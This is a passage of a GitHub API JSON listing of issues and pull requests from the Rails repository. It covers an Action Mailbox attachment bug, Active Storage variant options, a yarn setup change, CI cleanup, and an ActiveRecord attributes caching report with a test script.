            "login": "HashNotAdam",
            "id": 902714,
            "node_id": "MDQ6VXNlcjkwMjcxNA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/902714?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/HashNotAdam",
            "html_url": "https://github.com/HashNotAdam",
            "followers_url": "https://api.github.com/users/HashNotAdam/followers",
            "following_url": "https://api.github.com/users/HashNotAdam/following{/other_user}",
            "gists_url": "https://api.github.com/users/HashNotAdam/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/HashNotAdam/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/HashNotAdam/subscriptions",
            "organizations_url": "https://api.github.com/users/HashNotAdam/orgs",
            "repos_url": "https://api.github.com/users/HashNotAdam/repos",
            "events_url": "https://api.github.com/users/HashNotAdam/events{/privacy}",
            "received_events_url": "https://api.github.com/users/HashNotAdam/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-15T08:23:19Z",
        "updated_at": "2024-01-17T18:28:53Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "I have set up a mailbox to process DMARC reports. This has been working fine in most cases, but it seems that sometimes Google doesn't include body text in the emailonly a zipped XML file as an attachment.\r\n\r\nWhen this happens, Action Mailbox decodes the Base64 encoding of the attachment and assigns the string representation of the binary data to the body of the message without adding the file as an attachment. I have noticed that the email also isn't recognised as being multipart.\r\n\r\n### Steps to reproduce\r\n\r\nI've created [a gist which includes the unedited email source](https://gist.github.com/HashNotAdam/f5d08e370e70e9e39105fa765563c5b3) as copied from the EML file stored by Active Storage\r\n\r\n### Expected behavior\r\nThe body of the message should include the Base64 encoding of the attachment and there should be 1 attachment representing a ZIP file\r\n\r\n### Actual behavior\r\nCalling `body.to_s` on the underlying `Mail::Message` will return a string representation of the binary data which can be unzipped to return the XML. If the EML file were to be opened in an email client, this would be presented as an attachment\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.2.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50755/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50755/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50754",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50754/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50754/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50754/events",
        "html_url": "https://github.com/rails/rails/pull/50754",
        "id": 2081074654,
        "node_id": "PR_kwDNIULOZAp6FQ",
        "number": 50754,
        "title": "Allow named variants to evaluate dynamic transformation options",
        "user": {
            "login": "xjunior",
            "id": 8156,
            "node_id": "MDQ6VXNlcjgxNTY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8156?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/xjunior",
            "html_url": "https://github.com/xjunior",
            "followers_url": "https://api.github.com/users/xjunior/followers",
            "following_url": "https://api.github.com/users/xjunior/following{/other_user}",
            "gists_url": "https://api.github.com/users/xjunior/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/xjunior/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/xjunior/subscriptions",
            "organizations_url": "https://api.github.com/users/xjunior/orgs",
            "repos_url": "https://api.github.com/users/xjunior/repos",
            "events_url": "https://api.github.com/users/xjunior/events{/privacy}",
            "received_events_url": "https://api.github.com/users/xjunior/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 9,
        "created_at": "2024-01-15T01:18:24Z",
        "updated_at": "2024-02-15T13:46:13Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50754",
            "html_url": "https://github.com/rails/rails/pull/50754",
            "diff_url": "https://github.com/rails/rails/pull/50754.diff",
            "patch_url": "https://github.com/rails/rails/pull/50754.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nSometimes you want to build a transformation based on the user input, or information persisted in the database (i.e.: add a watermark to a picture, crop based on user input)\r\n\r\n### Detail\r\n\r\nThis PR allow the transformations to be built based on user input:\r\n\r\n```ruby\r\nclass User < ApplicationRecord\r\n  has_one_attached :photo do |attachable|\r\n    attachable.variant :default, crop: ->(user) { user.crop_positions }\r\n    attachable.variant :thumb, crop: :crop_positions,\r\n                               resize_to_limit: [100, 100]\r\n  end\r\n\r\n  def crop_positions\r\n    [crop_x1, crop_y1, crop_x2, crop_y2]\r\n  end\r\nend\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n- [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n- [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n- [x] Tests are added or updated if you fix a bug or add a feature.\r\n- [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50754/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50754/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50753",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50753/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50753/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50753/events",
        "html_url": "https://github.com/rails/rails/pull/50753",
        "id": 2080912764,
        "node_id": "PR_kwDNIULOZAg10Q",
        "number": 50753,
        "title": "removes deprecated yarn check in bin/setup",
        "user": {
            "login": "adrienpoly",
            "id": 7847244,
            "node_id": "MDQ6VXNlcjc4NDcyNDQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7847244?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/adrienpoly",
            "html_url": "https://github.com/adrienpoly",
            "followers_url": "https://api.github.com/users/adrienpoly/followers",
            "following_url": "https://api.github.com/users/adrienpoly/following{/other_user}",
            "gists_url": "https://api.github.com/users/adrienpoly/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/adrienpoly/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/adrienpoly/subscriptions",
            "organizations_url": "https://api.github.com/users/adrienpoly/orgs",
            "repos_url": "https://api.github.com/users/adrienpoly/repos",
            "events_url": "https://api.github.com/users/adrienpoly/events{/privacy}",
            "received_events_url": "https://api.github.com/users/adrienpoly/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-14T21:56:05Z",
        "updated_at": "2024-01-15T20:04:53Z",
        "closed_at": "2024-01-15T18:50:20Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50753",
            "html_url": "https://github.com/rails/rails/pull/50753",
            "diff_url": "https://github.com/rails/rails/pull/50753.diff",
            "patch_url": "https://github.com/rails/rails/pull/50753.patch",
            "merged_at": "2024-01-15T18:50:20Z"
        },
        "body": "### Motivation / Background\r\n\r\nWhile running a fresh Rails install I got a bunch of warnings from the command `yarn check --check-files` and dig a bit into [the documentation](https://classic.yarnpkg.com/lang/en/docs/cli/check/#toc-yarn-check)\r\n\r\nThis Pull Request has been created because it appears the `check` command is deprecated and will be removed in [Yarn 2.0](https://github.com/yarnpkg/rfcs/pull/106)\r\n\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the generator to replace \r\n```\r\nsystem(\"yarn check --check-files\") || system!(\"yarn install\") \r\n``` \r\n\r\nby the recommended command\r\n\r\n```\r\nsystem(\"yarn install--check-files\")\r\n``` \r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50753/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50753/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50752",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50752/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50752/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50752/events",
        "html_url": "https://github.com/rails/rails/pull/50752",
        "id": 2080883313,
        "node_id": "PR_kwDNIULOZAfbZQ",
        "number": 50752,
        "title": "Re-word #49856 CHANGELOG entry [ci skip]",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-14T20:20:28Z",
        "updated_at": "2024-01-15T13:18:49Z",
        "closed_at": "2024-01-15T09:55:49Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50752",
            "html_url": "https://github.com/rails/rails/pull/50752",
            "diff_url": "https://github.com/rails/rails/pull/50752.diff",
            "patch_url": "https://github.com/rails/rails/pull/50752.patch",
            "merged_at": "2024-01-15T09:55:49Z"
        },
        "body": "Follow-up to [#49856][]\r\n\r\nReplace shell word expansion with full English. In addition to that change, elaborate on the changes with more detailed explanation.\r\n\r\n[#49856]: https://github.com/rails/rails/pull/49856#discussion_r1451634684",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50752/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50752/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50751",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50751/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50751/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50751/events",
        "html_url": "https://github.com/rails/rails/pull/50751",
        "id": 2080798599,
        "node_id": "PR_kwDNIULOZAbNcA",
        "number": 50751,
        "title": "Add silenced? for Action View Start subscriber",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-14T16:27:43Z",
        "updated_at": "2024-01-16T22:36:53Z",
        "closed_at": "2024-01-16T11:37:15Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50751",
            "html_url": "https://github.com/rails/rails/pull/50751",
            "diff_url": "https://github.com/rails/rails/pull/50751.diff",
            "patch_url": "https://github.com/rails/rails/pull/50751.patch",
            "merged_at": "2024-01-16T11:37:15Z"
        },
        "body": "### Motivation / Background\r\n\r\nRef #45796 \r\n\r\nPreviously, the `render_template.action_view` and `render_layout.action_view` events would always be handled as if they had subscribers even if the log level of its subscribers result in nothing being logged. For regular `LogSubscriber`s, `subscribe_log_level` could be used to optimize these cases but the Start subscriber is not a subclass of `LogSubscriber`.\r\n\r\n### Detail\r\n\r\nThis commit implements a `#subscribed?` method for the Start subscriber so that it can also benefit from the `subscribe_log_level` optimization.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50751/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50751/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50750",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50750/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50750/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50750/events",
        "html_url": "https://github.com/rails/rails/pull/50750",
        "id": 2080753630,
        "node_id": "PR_kwDNIULOZAY8BQ",
        "number": 50750,
        "title": "Backport: Remove codespell step from CI",
        "user": {
            "login": "akhilgkrishnan",
            "id": 22231095,
            "node_id": "MDQ6VXNlcjIyMjMxMDk1",
            "avatar_url": "https://avatars.githubusercontent.com/u/22231095?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akhilgkrishnan",
            "html_url": "https://github.com/akhilgkrishnan",
            "followers_url": "https://api.github.com/users/akhilgkrishnan/followers",
            "following_url": "https://api.github.com/users/akhilgkrishnan/following{/other_user}",
            "gists_url": "https://api.github.com/users/akhilgkrishnan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akhilgkrishnan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akhilgkrishnan/subscriptions",
            "organizations_url": "https://api.github.com/users/akhilgkrishnan/orgs",
            "repos_url": "https://api.github.com/users/akhilgkrishnan/repos",
            "events_url": "https://api.github.com/users/akhilgkrishnan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akhilgkrishnan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-14T14:35:17Z",
        "updated_at": "2024-01-15T18:52:43Z",
        "closed_at": "2024-01-15T18:52:43Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50750",
            "html_url": "https://github.com/rails/rails/pull/50750",
            "diff_url": "https://github.com/rails/rails/pull/50750.diff",
            "patch_url": "https://github.com/rails/rails/pull/50750.patch",
            "merged_at": "2024-01-15T18:52:43Z"
        },
        "body": "Backport https://github.com/rails/rails/pull/50657 to `7-0-stable`\r\n\r\nNote: In `7-0-stable` the lint is only used for checking the codespell, so we can completely remove the lint.yml \r\n\r\ncc\\ @zzak \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50750/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50750/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50749",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50749/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50749/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50749/events",
        "html_url": "https://github.com/rails/rails/pull/50749",
        "id": 2080726501,
        "node_id": "PR_kwDNIULOZAXkdA",
        "number": 50749,
        "title": "Fix typo in ActiveSupport changelog",
        "user": {
            "login": "Earlopain",
            "id": 14981592,
            "node_id": "MDQ6VXNlcjE0OTgxNTky",
            "avatar_url": "https://avatars.githubusercontent.com/u/14981592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Earlopain",
            "html_url": "https://github.com/Earlopain",
            "followers_url": "https://api.github.com/users/Earlopain/followers",
            "following_url": "https://api.github.com/users/Earlopain/following{/other_user}",
            "gists_url": "https://api.github.com/users/Earlopain/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Earlopain/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Earlopain/subscriptions",
            "organizations_url": "https://api.github.com/users/Earlopain/orgs",
            "repos_url": "https://api.github.com/users/Earlopain/repos",
            "events_url": "https://api.github.com/users/Earlopain/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Earlopain/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-14T13:20:40Z",
        "updated_at": "2024-01-14T17:47:13Z",
        "closed_at": "2024-01-14T16:31:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50749",
            "html_url": "https://github.com/rails/rails/pull/50749",
            "diff_url": "https://github.com/rails/rails/pull/50749.diff",
            "patch_url": "https://github.com/rails/rails/pull/50749.patch",
            "merged_at": "2024-01-14T16:31:12Z"
        },
        "body": "Backport to 7.1 as well because https://github.com/rails/rails/commit/f06d5838a476c6cb8ed27084f29e61f1e949257e\r\n\r\ncc @907th for #50292 which contains this for 7.0 but hasn't been merged yet.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50749/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50749/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50748",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50748/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50748/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50748/events",
        "html_url": "https://github.com/rails/rails/issues/50748",
        "id": 2080619231,
        "node_id": "I_kwDNIULOfAO63w",
        "number": 50748,
        "title": "`ActiveRecord#attributes` is affected immediately after migration",
        "user": {
            "login": "sinsoku",
            "id": 248174,
            "node_id": "MDQ6VXNlcjI0ODE3NA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/248174?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sinsoku",
            "html_url": "https://github.com/sinsoku",
            "followers_url": "https://api.github.com/users/sinsoku/followers",
            "following_url": "https://api.github.com/users/sinsoku/following{/other_user}",
            "gists_url": "https://api.github.com/users/sinsoku/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sinsoku/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sinsoku/subscriptions",
            "organizations_url": "https://api.github.com/users/sinsoku/orgs",
            "repos_url": "https://api.github.com/users/sinsoku/repos",
            "events_url": "https://api.github.com/users/sinsoku/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sinsoku/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-14T07:38:28Z",
        "updated_at": "2024-01-14T16:19:08Z",
        "closed_at": "2024-01-14T16:19:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "## Summary\r\n\r\n`columns` and `column_names` cache the schema definition, so the return value will not change after a migration.\r\nHowever, the `attributes` method is always affected by the latest DB schema.\r\n\r\nThis behavior can cause problems when adding new columns in rolling deployments.\r\nThis is because older revisions of the Rails server do not support the new columns.\r\n\r\n### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n  end\r\nend\r\n\r\nclass AddTitleToPost < ActiveRecord::Migration[7.1]\r\n  def self.up\r\n    add_column :posts, :title, :string\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_post_attributes\r\n    Post.create!\r\n\r\n    post1 = Post.first\r\n    assert_equal({ \"id\" => post1.id }, post1.attributes)\r\n\r\n    AddTitleToPost.up\r\n\r\n    # `.columns` and `.column_names` returns column information before migration.\r\n    assert_equal 1, Post.columns.size\r\n    assert_equal [\"id\"], Post.column_names\r\n\r\n    # Caching is effective if the same SQL is specified, so add SQL comments to avoid it.\r\n    post2 = Post.annotate(\"after migration\").first\r\n    assert_equal({ \"id\" => post2.id }, post2.attributes)\r\n    # Failure:\r\n    # BugTest#test_post_attributes [issue.rb:51]:\r\n    # Expected: {\"id\"=>1}\r\n    #   Actual: {\"id\"=>1, \"title\"=>nil}\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nI think the attributes method should return a Hash that matches the information before migration, similar to `columns` and `column_names`.\r\n\r\n### Actual behavior\r\n\r\nThe `attributes` method includes the same columns as the latest DB schema.\r\n\r\n### System configuration\r\n**Rails version**: v7.1.2\r\n\r\n**Ruby version**: v3.3.0\r\n\r\n### Additional information\r\n\r\nUsing `column_names` allows you to use attributes safely in rolling deployments.\r\n\r\n```ruby\r\npost.attributes.slice(*Post.column_names)\r\n```\r\n\r\nBut this code is not cool.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50748/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50748/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50747",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50747/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50747/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50747/events",
        "html_url": "https://github.com/rails/rails/pull/50747",
        "id": 2080585372,
        "node_id": "PR_kwDNIULOZAQlUw",
        "number": 50747,
        "title": "Remove python setup from CI",
        "user": {
            "login": "akhilgkrishnan",
            "id": 22231095,
            "node_id": "MDQ6VXNlcjIyMjMxMDk1",
            "avatar_url": "https://avatars.githubusercontent.com/u/22231095?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akhilgkrishnan",
            "html_url": "https://github.com/akhilgkrishnan",
            "followers_url": "https://api.github.com/users/akhilgkrishnan/followers",
            "following_url": "https://api.github.com/users/akhilgkrishnan/following{/other_user}",
            "gists_url": "https://api.github.com/users/akhilgkrishnan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akhilgkrishnan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akhilgkrishnan/subscriptions",
            "organizations_url": "https://api.github.com/users/akhilgkrishnan/orgs",
            "repos_url": "https://api.github.com/users/akhilgkrishnan/repos",
            "events_url": "https://api.github.com/users/akhilgkrishnan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akhilgkrishnan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-14T05:03:01Z",
